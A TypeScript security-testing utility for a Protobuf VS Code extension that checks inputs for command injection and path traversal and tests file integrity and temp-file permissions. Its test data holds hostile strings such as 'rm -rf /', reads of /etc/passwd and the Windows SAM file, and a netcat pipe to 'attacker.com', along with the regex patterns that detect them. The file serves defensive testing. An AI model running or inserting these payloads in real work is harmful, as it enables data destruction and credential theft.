/**
 * Security Testing Framework for Protobuf VSCode Extension
 * Provides security-focused test utilities and helpers
 */

import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';

/**
 * Security test configuration
 */
export interface SecurityTestConfig {
  enableLogging: boolean;
  timeoutMs: number;
}

/**
 * Security test result
 */
export interface SecurityTestResult {
  testName: string;
  passed: boolean;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  details?: string;
}

/**
 * Security testing utilities
 */
export class SecurityTester {
  private config: SecurityTestConfig;

  constructor(config: Partial<SecurityTestConfig> = {}) {
    this.config = {
      enableLogging: true,
      timeoutMs: 5000,
      ...config,
    };
  }

  /**
   * Test for command injection vulnerabilities
   */
  async testCommandInjection(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    // Test dangerous characters in file paths
    const dangerousPaths = [
      '../../../etc/passwd',
      'file; rm -rf /',
      'file && cat /etc/passwd',
      'file`whoami`',
      'file$(echo injection)',
      'file|nc attacker.com 1234',
    ];

    for (const testPath of dangerousPaths) {
      try {
        // This would normally be processed by our security functions
        // Test if they would be caught
        const hasInjection = this.detectCommandInjection(testPath);

        results.push({
          testName: 'Command Injection Detection',
          passed: !hasInjection,
          severity: hasInjection ? 'high' : 'low',
          description: `Test path: ${testPath}`,
          details: hasInjection ? 'Command injection pattern detected' : 'No injection detected',
        });
      } catch (error) {
        results.push({
          testName: 'Command Injection Error Handling',
          passed: false,
          severity: 'medium',
          description: `Error processing test path: ${testPath}`,
          details: error instanceof Error ? error.message : String(error),
        });
      }
    }

    return results;
  }

  /**
   * Test for path traversal vulnerabilities
   */
  async testPathTraversal(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    const traversalPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '....//....//....//....//....//etc/passwd',
    ];

    for (const testPath of traversalPaths) {
      const hasTraversal = this.detectPathTraversal(testPath);

      results.push({
        testName: 'Path Traversal Detection',
        passed: !hasTraversal,
        severity: hasTraversal ? 'critical' : 'low',
        description: `Test path: ${testPath}`,
        details: hasTraversal ? 'Path traversal pattern detected' : 'No traversal detected',
      });
    }

    return results;
  }

  /**
   * Test file hash integrity verification
   */
  async testFileIntegrity(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    // Create test file with known content
    const testContent = 'test file content for integrity verification';
    const testFile = path.join(__dirname, '.test-integrity-file');

    try {
      fs.writeFileSync(testFile, testContent);

      // Calculate hash of original content
      const originalHash = crypto.createHash('sha256').update(testContent).digest('hex');

      // Simulate verification
      const fileContent = fs.readFileSync(testFile);
      const calculatedHash = crypto.createHash('sha256').update(fileContent).digest('hex');

      const integrityMatch = originalHash === calculatedHash;

      results.push({
        testName: 'File Integrity Verification',
        passed: integrityMatch,
        severity: integrityMatch ? 'low' : 'high',
        description: 'SHA256 integrity verification test',
        details: integrityMatch ? 'Hashes match' : `Hash mismatch: expected ${originalHash}, got ${calculatedHash}`,
      });

      // Cleanup
      fs.unlinkSync(testFile);
    } catch (error) {
      results.push({
        testName: 'File Integrity Test Error',
        passed: false,
        severity: 'medium',
        description: 'Error during integrity test',
        details: error instanceof Error ? error.message : String(error),
      });
    }

    return results;
  }

  /**
   * Test temporary file security
   */
  async testTemporaryFileSecurity(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    try {
      // Test temporary file creation with predictable names
      const predictableName = path.join(require('os').tmpdir(), 'temp-file-test.txt');
      fs.writeFileSync(predictableName, 'test');

      // Test secure temporary file creation
      const secureRandom = crypto.randomBytes(16).toString('hex');
      const secureName = path.join(require('os').tmpdir(), `secure-${secureRandom}.tmp`);
      fs.writeFileSync(secureName, 'test');

      // Check file permissions
      const stats1 = fs.statSync(predictableName);
      const stats2 = fs.statSync(secureName);

      const predictablePermissions = (stats1.mode & 0o777) === 0o644 || (stats1.mode & 0o777) === 0o666;
      const securePermissions = (stats2.mode & 0o777) === 0o600; // Owner read/write only

      results.push({
        testName: 'Temporary File Security',
        passed: securePermissions && !predictablePermissions,
        severity: !securePermissions || predictablePermissions ? 'medium' : 'low',
        description: 'Temporary file creation and permissions test',
        details: `Predictable permissions: ${predictablePermissions}, Secure permissions: ${securePermissions}`,
      });

      // Cleanup
      fs.unlinkSync(predictableName);
      fs.unlinkSync(secureName);
    } catch (error) {
      results.push({
        testName: 'Temporary File Test Error',
        passed: false,
        severity: 'medium',
        description: 'Error during temporary file test',
        details: error instanceof Error ? error.message : String(error),
      });
    }

    return results;
  }

  /**
   * Detect command injection patterns
   */
  private detectCommandInjection(input: string): boolean {
    const dangerousPatterns = [
      /[;&|`$(){}[\]]/, // Shell metacharacters
      /\r?\n/, // Newline injection
      /^\s*[|&]/, // Command chaining at start
      /[|&]\s*$/, // Command chaining at end
      /\$\(/, // Command substitution
    ];

    return dangerousPatterns.some(pattern => pattern.test(input));
  }

  /**
   * Detect path traversal patterns
   */
  private detectPathTraversal(input: string): boolean {
    const traversalPatterns = [
      /\.\.[\\/]/, // Directory traversal
      /\.\.%2f/i, // URL-encoded traversal
      /\.\.%5c/i, // URL-encoded traversal (Windows)
      /%2e%2e%2f/i, // Double-encoded traversal
    ];

    return traversalPatterns.some(pattern => pattern.test(input));
  }

  /**
   * Run all security tests
   */
  async runAllTests(): Promise<SecurityTestResult[]> {
    if (this.config.enableLogging) {
      console.log('🔒 Running security tests...');
    }

    const allResults: SecurityTestResult[] = [];

    // Run tests in parallel for efficiency
    const testPromises = [
      this.testCommandInjection(),
      this.testPathTraversal(),
      this.testFileIntegrity(),
      this.testTemporaryFileSecurity(),
    ];

    const testResults = await Promise.all(testPromises);
    testResults.forEach(results => allResults.push(...results));

    // Generate summary
    const totalTests = allResults.length;
    const passedTests = allResults.filter(r => r.passed).length;
    const failedTests = totalTests - passedTests;
    const criticalFailures = allResults.filter(r => r.severity === 'critical').length;
    const highFailures = allResults.filter(r => r.severity === 'high').length;

    if (this.config.enableLogging) {
      console.log(`\n🔍 Security Test Results:`);
      console.log(`   Total tests: ${totalTests}`);
      console.log(`   Passed: ${passedTests}`);
      console.log(`   Failed: ${failedTests}`);
      console.log(`   Critical: ${criticalFailures}`);
      console.log(`   High: ${highFailures}`);

      if (failedTests > 0) {
        console.log('\n❌ Failed tests:');
        allResults.filter(r => !r.passed).forEach(r => console.log(`   - ${r.testName}: ${r.description}`));
      }
    }

    return allResults;
  }
}

/**
 * Global security tester instance
 */
export const securityTester = new SecurityTester();
